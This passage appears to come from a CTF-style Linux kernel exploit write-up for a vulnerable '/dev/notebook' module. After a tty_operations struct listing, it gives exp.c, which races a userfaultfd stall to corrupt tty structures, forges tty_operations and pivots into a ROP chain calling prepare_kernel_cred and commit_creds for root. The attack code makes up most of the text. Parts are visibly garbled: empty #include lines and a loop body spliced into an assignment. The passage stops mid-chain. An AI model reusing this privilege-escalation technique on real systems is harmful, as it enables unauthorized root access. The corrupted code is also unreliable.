        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int  (*write_room)(struct tty_struct *tty);
        int  (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                     unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        const struct file_operations *proc_fops;
    };
> exp.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "kernelpwn.h"
    #define PTM_UNIX98_OPS 0xffffffff81e8e440
    #define PTY_UNIX98_OPS 0xffffffff81e8e320
    #define COMMIT_CREDS 0xffffffff810a9b40
    #define PREPARE_KERNEL_CRED 0xffffffff810a9ef0
    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929
    #define PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50
    #define MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c
    #define POP_RDI_RET 0xffffffff81007115
    #define MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833 // mov rdi, rax; xor eax, eax; cmp rdi, 0x9000000; je 0x245843; pop rbp; ret;
    #define POP_RDX_RET 0xffffffff81358842
    #define RET 0xffffffff81000091
    #define SWAPGS_POP_RBP_RET 0xffffffff810637d4
    #define IRETQ 0xffffffff810338bb
    #define POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1
    #define POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38
    #define POP_RBP_RET 0xffffffff81000367
    #define POP_RBX_POP_RBP_RET 0xffffffff81002141
    #define POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7
    #define TTY_STRUCT_SIZE 0x2e0
    static long page_size;
    static sem_t sem_add, sem_edit;
    static char * buf; // for userfaultfd
    static char *page = NULL;
    static void *
    fault_handler_thread(void *arg)
    {
        struct uffd_msg msg;
        int fault_cnt = 0;
        long uffd;
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
        uffd = (long) arg;
        for (;;) 
        {
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
            if (nready == -1)
                errExit("poll");
            nread = read(uffd, &msg, sizeof(msg));
            sleep(100);
            if (nread == 0)
                errExit("EOF on userfaultfd!\n");
            if (nread == -1)
                errExit("read");
            if (msg.event != UFFD_EVENT_PAGEFAULT)
                errExit("Unexpected event on userfaultfd\n");
            uffdio_copy.src = (unsigned long) page;
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
            return NULL;
        }
    }
    long note_fd;
    typedef struct 
    {
        size_t idx;
        size_t size;
        char * buf;
    } Note;
    void noteAdd(size_t idx, size_t size, char * buf)
    {
        Note note = 
        {
            .idx = idx,
            .size = size,
            .buf = buf,
        };
        ioctl(note_fd, 0x100, &note);
    }
    void noteAddWrapper(void * args)
    {
        Note * note = (Note*) args;
        noteAdd(note->idx, note->size, note->buf);
    }
    void noteDel(size_t idx)
    {
        Note note = 
        {
            .idx = idx,
        };
        ioctl(note_fd, 0x200, &note);
    }
    void noteEdit(size_t idx, size_t size, char * buf)
    {
        Note note = 
        {
            .idx = idx,
            .size = size,
            .buf = buf,
        };
        ioctl(note_fd, 0x300, &note);
    }
    void noteEditWrapper(void * args)
    {
        Note * note = (Note*) args;
        noteEdit(note->idx, note->size, note->buf);
    }
    void noteGift(char * buf)
    {
        Note note = 
        {
            .buf = buf,
        };
        ioctl(note_fd, 100, &note);
    }
    void evilAdd(void * args)
    {
        sem_wait(&sem_add);
        noteAdd((int)args, 0x50, buf);
    }
    void evilEdit(void * args)
    {
        sem_wait(&sem_edit);
        noteEdit((int)args, 0x2000, buf);
    }
    struct
    {
        void * buf;
        size_t size;
    } notebook[0x10];
    int main(int argc, char ** argv, char ** envp)
    {
        int tty_fd[0x100], tty_idx, fake_tty_ops_idx = -1, fake_stack_idx = -1, hit_tty = 0;
        size_t tty_data[0x200], fake_tty_data[0x200], tty_ops, fake_tty_ops_data[0x200], rop[0x100];
        pthread_t tmp_t, add_t, edit_t;
        Note note;
        saveStatus();
        sem_init(&sem_add, 0, 0);
        sem_init(&sem_edit, 0, 0);
        note_fd = open("/dev/notebook", O_RDWR);
        buf = (char*) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        page = malloc(0x1000);
        strcpy(page, "arttnba3");
        page_size = sysconf(_SC_PAGE_SIZE);
        // register userfaultfd
        registerUserFaultFd(buf, 0x1000, fault_handler_thread);
        // initialize the notebook
        for (int i = 0; i write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;
        // second migration back to tty_operations
        fake_tty_data[1] = POP_RBX_POP_RBP_RET + kernel_offset;
        fake_tty_data[3] = notebook[fake_tty_ops_idx].buf;
        fake_tty_data[4] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;
        // third migration to a note
        fake_tty_ops_data[1] = POP_RBP_RET + kernel_offset;
        fake_tty_ops_data[2] = notebook[fake_stack_idx].buf;
        fake_tty_ops_data[3] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;
        // final rop
        int rop_idx = 0;
        rop[rop_idx++] = 0x3361626e74747261; //arttnba3
        rop[rop_idx++] = POP_RDI_RET + kernel_offset;
        rop[rop_idx++] = 0;
        rop[rop_idx++] = prepare_kernel_cred;
        rop[rop_idx++] = POP_RDX_RET + kernel_offset;
        rop[rop_idx++] = RET;
        rop[rop_idx++] = MOV_RDI_RAX_POP_RBP_RET + kernel_offset;
        rop[rop_idx++] = 0x3361626e74747261; //arttnba3
        rop[rop_idx++] = commit_creds;
        rop[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22 + kernel_offset;
        rop[rop_idx++] = 0;